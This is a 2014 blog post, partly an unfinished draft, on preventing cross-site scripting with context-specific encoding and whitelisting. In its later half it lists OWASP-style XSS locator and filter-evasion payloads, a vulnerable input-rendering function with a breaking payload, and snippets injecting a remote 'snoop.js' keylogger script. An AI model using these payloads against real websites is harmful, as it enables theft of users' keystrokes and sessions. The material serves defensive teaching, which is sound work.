---
layout: posts
title: "5 Takeaways to rid your site from XSS vulnerabilities"
description: "If you are a developer, you need to take security very seriously and here is why"
keywords: "xss, cross site scripting, hacking, vulnerability, scripting"
date: 2014-10-09 23:13
categories: ['blog']
tags: ['security']
comments: true
meta: true
image:
  feature: covers/xss-security.jpg
  bg_style: 'background-position: left; background-size: contain; background-repeat: no-repeat; background-color: #000C14;'
quote:
    text: "When solving problems, dig at the roots instead of just hacking at the leaves."
    title: The College Blue Book
    author: Anthony J. D'Angelo
---
Every couple of years ["The Open Web Application Security Project" (OWASP)][6] publishes its [Top 10 list][1] of most
prevalent web application security flaws and often people complain that nothing new has come up. There in itself lies
a **problem**, and as rightful developers we need to take heed of this anti-pattern and do something about it.

One of those ever present vulnerabilities that is always likely to exist on a website most of the time is
Cross-site scripting (XSS)[^1].

[**Cross-site scripting (XSS)**][5] is the most prevalent web application security flaw. **XSS** flaws occur when an
application includes user supplied data in a page sent to the browser without properly validating or escaping that
content.
{: .alert.alert-warning }

Even though the move to modern development frameworks such as .NET, which provide automatic protection against this
vulnerability amongst others, has removed a lot of the onus on developers to understand its technical detail, it is
this very lack of deep understanding of security flaws and the increase in client side code are two areas that
continue to keep XSS at the top of the security flaws list.

> It is a technical debt that you will have to pay sooner or later.

Whilst tasked to fix XSS security holes in a legacy application that I was supporting, the exercise was so
daunting and time consuming that it made me firm up my belief that security indeed needs to be taken **very**
seriously. It is a technical debt that you will have to pay sooner or later.

There are automated tools that can find and identify XSS problems automatically. However because every application
builds output pages differently --- with a mixture of server and client side --- automated detection has
become very difficult. It is only with code review (requiring strong implementation awareness) and laborious manual
regression testing that a level of near complete coverage can be achieved.

So don't let things slip this far in your current development. **Update your project's [DoD][7] and add specific
references to security** as a first step.

In the mean time, to get up to speed with the topic, I share with you 5 key learnings that I took away from my
security pruning exercise to to comprehensively prevent XSS taking place on your site.

## 1. Encoding
User input is typically *not* sanitized in many systems and is left as is. However, anytime untrusted user input is
rendered in any *presentation form*, it **must** be encoded accordingly.

**Encoding** is the escaping of raw text with HTML entity encoding to prevent switching to any execution content. The 5
notorious characters that you normally pay particular attention to are `& < > " '` which need to be **encoded**
as `&amp; &lt; &gt; &quote; &#x27 &#x2F;` in output accordingly.
{: .alert.alert-warning }

Meaning, that **you MUST escape the untrusted user data with the appropriate type of encoding depending on the part
of HTML document you're putting it into**.

To help you appreciate the concept of context and different encoding functions, see the following table lists some of
the various HTML document locations that untrusted data can be rendered in and references to the different types of
encoding functions that exist in a security encoding library such as Microsoft's [AntiXSS][9].

Context | Encoding function |
--------|:------------------|
HTML Body | [`HtmlEncode`][10]
HTML Attribute | [`HtmlAttributeEncode`][11]
URL in SRC or HREF attribute | [`UrlEncode`][12]
Query Parameter | [`UrlPathEncode`][15]
JavaScript Value | [`JavaScriptStringEncode`][13]
CSS Value | [`CssEncode`][14]

### Can I insert untrusted data in any location?
**NO**.

As OWASP strongly [recommends][8], you should by default **deny all** untrusted data from being rendered in your
HTML document except for areas such as what was mentioned above that uses the right type of encoding. In particular,
they highlight some clear cases which you should never go near unless you really know what you are doing:

{% highlight html %}
<script>...NEVER PUT UNTRUSTED DATA HERE...</script>   directly in a script

<!-- ...NEVER PUT UNTRUSTED DATA HERE... -->           inside an HTML comment

<div ...NEVER PUT UNTRUSTED DATA HERE...=test />       in an attribute name

<NEVER PUT UNTRUSTED DATA HERE... href="/test" />      in a tag name

<style>...NEVER PUT UNTRUSTED DATA HERE...</style>    directly in CSS
{% endhighlight %}

## 2. Locator Strings

~~~
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
~~~

~~~
'';!--"<XSS>=&{()}
~~~


## 3. White list HREF SRC attributes
Positive or “whitelist” input validation is also recommended as it helps protect against XSS, but is not a complete
defense as many applications require special characters in their input. Such validation should, as much as possible,
validate the length, characters, format, and business rules on that data before accepting the input.


```
// Embedded tab
<IMG SRC="jav	ascript:alert('XSS');">

// Embedded Encoded tab
<IMG SRC="jav&#x09;ascript:alert('XSS');">

// Embedded carriage return to break up XSS
<IMG SRC="jav&#x0D;ascript:alert('XSS');">

```

## 4. Exploiting XSS
* Using `<svg onload="..." />`
* Using `<img onload="..." />`
* Passing in query string
* Using bit.ly to obfuscate a URL, or HTML encoding - its getting easy to get users to click on malciious links because of url shorterning
* Breaking the code



## 5. Implementation Awareness
{% highlight javascript %}
function escape(input) {
    return '<input type="text" value="' + input + '">';
}
{% endhighlight %}


~~~
"><svg onload="alert('hello world');">
~~~








#### XSS Locator


{% highlight javascript %}
javascript:alert(‘hello’);
java&#010;script:alert(‘hello’);

// Embedded tab
jav	ascript:alert('hello');

// Embedded newline to break up XSS
java&#X0A;script:alert(‘hello’);
{% endhighlight %}

Ref: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet


# Exploiting
```
// Embed and execute client side script by using a script tag if it is allowed in XSS vulnerable web page
<script src="http://localhost:3000/snoop.js"></script>

// Encode special tags to HTML code to bypass sites with simple inadequate encoding of special tags only
&#060;script src="http://localhost:3000/snoop.js"&#062;&#060;/script&#062;
```

Some sites will prevent any `<script>` tags to be embedded or posted in their input fields. In that case, you
could try to embed and run xss-keylogger client side script as part of the `onload` attribute of an `svg` element.

`<svg onload="http://localhost:3000/snoop.js" />`


{% highlight javascript %}
var d=document;var s=d.createElement('script');s.type='text/javascript';s.src='http://localhost:3000/snoop.js';var h=d.getElementsByTagName('head')[0];h.appendChild(s);
{% endhighlight %}

{% highlight javascript %}
function loadScript(url, callback) {
    // Adding the script tag to the head as suggested before
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;

    // Then bind the event to the callback function.
    // There are several events for cross browser compatibility.
    script.onreadystatechange = callback;
    script.onload = callback;

    // Fire the loading
    head.appendChild(script);
}
{% endhighlight %}

## How to get it right
To improve my own knowledge on this domain, I thought I'd try and learn how to hack. It turned out to be a lot of
fun whilst at it.

Just wanted to move on from the `alert` messages that most XSS demonstrations show. Own complete application.
// Talk about XSS Keylogger and the learning
// For something more fletched out, [Browser Exploitation Framework (BeEF)][3]

Heaps of other methods. Suggest that you listen to [Application Security for RIAS][4] that demonstrats CSRF and even ClickJacking which I am
tempted to try on my site and see if it has any effects increasing the number of followers on my twitter - just kidding!

## References:
[^1]: [Whitehat Security Report][2] shows that XSS is second most likely vulnerability to exist on a website at 53%
just behind Information Leakage (55%).

* https://github.com/cure53/xss-challenge-wiki/wiki/prompt.ml
* http://prompt.ml/0

[1]: https://www.owasp.org/index.php/Top_10_2013-Top_10
[2]: https://www.whitehatsec.com/assets/WPstatsReport_052013.pdf
[3]: http://beefproject.com
[4]: http://www.sencha.com/conference/session/application-security-for-rias
[5]: http://en.wikipedia.org/wiki/Cross-site_scripting
[6]: https://www.owasp.org/index.php/About_OWASP
[7]: https://www.scrum.org/Resources/Scrum-Glossary/Definition-of-Done
[8]: https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#RULE_.230_-_Never_Insert_Untrusted_Data_Except_in_Allowed_Locations
[9]: http://msdn.microsoft.com/en-us/library/system.web.security.antixss.antixssencoder(v=vs.110).aspx
[10]: http://msdn.microsoft.com/en-us/library/hh244070(v=vs.110).aspx
[11]: http://msdn.microsoft.com/en-us/library/system.web.security.antixss.antixssencoder.htmlattributeencode(v=vs.110).aspx
[12]: http://msdn.microsoft.com/en-us/library/hh244091(v=vs.110).aspx
[13]: http://msdn.microsoft.com/en-us/library/system.web.util.httpencoder.javascriptstringencode(v=vs.110).aspx
[14]: http://msdn.microsoft.com/en-us/library/system.web.security.antixss.antixssencoder.cssencode(v=vs.110).aspx
[15]: http://msdn.microsoft.com/en-us/library/system.web.security.antixss.antixssencoder.urlpathencode(v=vs.110).aspx
